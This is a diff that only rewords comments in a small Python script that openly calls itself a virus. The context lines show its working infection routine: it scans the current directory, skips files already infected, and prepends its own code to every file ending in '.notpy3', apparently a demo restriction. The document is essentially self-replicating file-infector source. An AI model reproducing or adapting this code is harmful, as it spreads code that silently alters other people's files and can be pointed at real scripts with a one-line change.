@@ -2,7 +2,7 @@
 import os                                                               #VCODE
 import sys                                                              #VCODE
                                                                         #VCODE
-# Get list of all files.                                                #VCODE
+# Get a list of all files in the current working directory.             #VCODE
 dirs = os.listdir()                                                     #VCODE
                                                                         #VCODE
 # Read ourself.                                                         #VCODE
@@ -15,11 +15,11 @@ with open(sys.argv[0], "r") as fp:                                      #VCODE
                                                                         #VCODE
 # Iterate through each file/dir.                                        #VCODE
 for entry in dirs:                                                      #VCODE
-    # Do nothing if extension isn't ".notpy3".                          #VCODE
+    # Do nothing if the file's extension isn't ".notpy3".               #VCODE
     if(os.path.splitext(entry)[1] != ".notpy3"):                        #VCODE
         continue                                                        #VCODE
                                                                         #VCODE
-    # Read victim.                                                      #VCODE
+    # Read the victim script.                                           #VCODE
     with open(entry, "r") as fp:                                        #VCODE
         victim = fp.read()                                              #VCODE
                                                                         #VCODE
@@ -28,12 +28,12 @@ for entry in dirs:                                                      #VCODE
         print("Script {} is already infected...".format(entry))         #VCODE
         continue                                                        #VCODE
                                                                         #VCODE
-    # Announce that we're infected the script.                          #VCODE
+    # Announce that we're infected the victim script.                   #VCODE
     print("Infecting {}!".format(entry))                                #VCODE
                                                                         #VCODE
-    # Prepend virus to victim.                                          #VCODE
+    # Prepend virus script to victim script.                            #VCODE
     infected = "#!/usr/bin/python3\n" + virus + victim                  #VCODE
                                                                         #VCODE
-    # Write infected victim back.                                       #VCODE
+    # Write infected victim script back.                                       #VCODE
     with open(entry, "w") as fp:                                        #VCODE
         fp.write(infected)                                              #VCODE
